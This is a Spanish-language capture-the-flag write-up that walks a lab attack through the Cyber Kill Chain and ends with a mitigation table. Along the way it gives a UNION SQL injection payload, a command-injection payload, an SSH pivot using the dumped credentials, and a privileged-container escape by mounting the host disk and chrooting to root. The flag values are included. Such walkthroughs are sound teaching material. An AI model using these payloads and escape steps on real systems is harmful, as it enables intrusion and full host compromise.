# Kill Chain — Jump Force CTF

## Modelo: Cyber Kill Chain (Lockheed Martin)

---

### Fase 1 — Reconnaissance (Reconocimiento)

**Objetivo:** identificar la superficie de ataque expuesta.

**Acciones:**
- Escaneo de puertos con `nmap -sV -sC -p- <IP>`
- Enumeración web con `gobuster` sobre el puerto 5000

**Hallazgos:**
- Puerto 80/tcp con Apache2 (Debian)
- Páginas PHP: `index.php`, `password.php`, `backup.php`, `index.html.bak`
- Pista explícita en `index.php`: "soy una vulnerabilidad? soy dos?"

**Concepto de seguridad:** exposición de información sensible (ficheros `.bak` accesibles públicamente, mensajes de debug visibles). OWASP A05 — Security Misconfiguration.

---

### Fase 2 — Weaponization (Preparación del arma)

**Objetivo:** identificar y preparar los vectores de explotación.

**Vulnerabilidades identificadas:**

1. **SQL Injection** en `password.php`
   - Query sin parametrizar: `WHERE id = '$id'`
   - Vector: UNION-based injection para extraer tabla `users`
   - Referencia: OWASP A03:2021, CWE-89

2. **Command Injection** en `backup.php`
   - Uso de `shell_exec()` con entrada del usuario sin sanitizar
   - Vector: inyección de comandos con `;` como separador
   - Referencia: OWASP A03:2021, CWE-78

3. **Privileged Container** en `docker-compose.yml`
   - `privileged: true` en servicio `dos`
   - Permite acceso a dispositivos de bloque del host
   - Referencia: CWE-250

**Preparación:** payloads UNION para SQL Injection, payload de command injection con separador `;`.

---

### Fase 3 — Delivery (Entrega)

**Objetivo:** enviar el ataque al objetivo.

**Vector de entrega:** HTTP GET/POST directo al servidor web en `http://<IP>:5000`

- SQL Injection vía parámetro `id` en `password.php` (método GET)
- Command Injection vía parámetros `command1`/`command2` en `backup.php` (método POST)

No se requiere autenticación previa. Los formularios son públicos.

---

### Fase 4 — Exploitation (Explotación)

**Objetivo:** ejecutar el ataque para obtener acceso inicial.

**4.1 SQL Injection — extracción de credenciales**

Payload: `1' UNION SELECT user,pass FROM users-- -`

Resultado: volcado de tabla `users` con credenciales en texto claro, incluyendo `pablo:tefeme!.`

**4.2 Command Injection — confirmación de RCE**

Payload en campo `command1`: `1; id`

Resultado: ejecución confirmada como `www-data` en el contenedor `uno`.

---

### Fase 5 — Installation (Persistencia / Acceso persistente)

**Objetivo:** mantener acceso y pivotar a la red interna.

**Acción:** usar las credenciales obtenidas por SQL Injection para conectar via SSH al contenedor `dos`, que solo es accesible desde la red interna de Docker.

```bash
# Desde RCE en contenedor uno
ssh -o StrictHostKeyChecking=no pablo@dos -p 2222
# Password: tefeme!.
```

El contenedor `dos` tiene iptables configurado para aceptar solo conexiones al puerto 2222, pero desde dentro de la red Docker el acceso es posible.

**Flag 1 obtenida:** `4d8c72671245d9d1b8e03a826db9d5ecead28c8c`

---

### Fase 6 — Command & Control (C2)

**Objetivo:** establecer control sobre el objetivo comprometido.

En este escenario la sesión SSH al contenedor `dos` como usuario `pablo` representa el canal de C2. Desde aquí el atacante tiene acceso interactivo al sistema.

No se requiere infraestructura adicional — la sesión SSH es suficiente para la siguiente fase.

---

### Fase 7 — Actions on Objectives (Objetivo final)

**Objetivo:** escalar privilegios, escapar del contenedor y comprometer el host.

**7.1 Confirmar el entorno privilegiado**

```bash
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff  ← capacidades completas (privileged)
```

**7.2 Listar dispositivos de bloque del host**

```bash
fdisk -l
# /dev/sda   → disco del host visible desde dentro del contenedor
```

**7.3 Montar el sistema de ficheros del host**

```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
ls /mnt/host/root/
```

El sistema de ficheros del host es accesible en `/mnt/host`. El contenedor ha "escapado" del aislamiento de Docker.

**7.4 Acceso root al host via chroot**

```bash
chroot /mnt/host
whoami   # root
hostname # host real
```

**Flag 2 obtenida:** `648d390c021ce7cfde2f95ea3fcd71ec`

---

## Diagrama completo de la Kill Chain

```
[Reconocimiento]
 nmap + gobuster → descubrir /password.php y /backup.php
         │
         ▼
[Preparación]
 SQL Injection payload + Command Injection payload
         │
         ▼
[Entrega]
 HTTP GET/POST a contenedor uno (puerto 5000)
         │
         ▼
[Explotación]
 SQL Injection → credenciales pablo:tefeme!.
 Command Injection → RCE como www-data en contenedor uno
         │
         ▼
[Persistencia / Pivoting]
 SSH pablo@dos:2222 (red interna Docker)
 → FLAG 1: 4d8c72671245d9d1b8e03a826db9d5ecead28c8c
         │
         ▼
[C2]
 Sesión SSH interactiva en contenedor dos
         │
         ▼
[Objetivo final — Container Escape]
 privileged: true → mount /dev/sda1 → chroot al host
 → FLAG 2: 648d390c021ce7cfde2f95ea3fcd71ec
```

---

## Lecciones de seguridad

| Vulnerabilidad | Mitigación |
|---|---|
| SQL Injection | Usar consultas parametrizadas (PDO/prepared statements) |
| Command Injection | Nunca pasar entrada de usuario a `shell_exec()`. Usar funciones nativas del lenguaje |
| `privileged: true` | Eliminar el flag. Usar `--cap-add` solo con las capacidades estrictamente necesarias |
| Credenciales en BD en texto claro | Hashear contraseñas con bcrypt/argon2 |
| Servicio SSH interno sin bastionado | Usar claves SSH, deshabilitar autenticación por contraseña |
| Red Docker plana | Segmentar contenedores con redes Docker separadas, aplicar políticas de firewall entre redes |
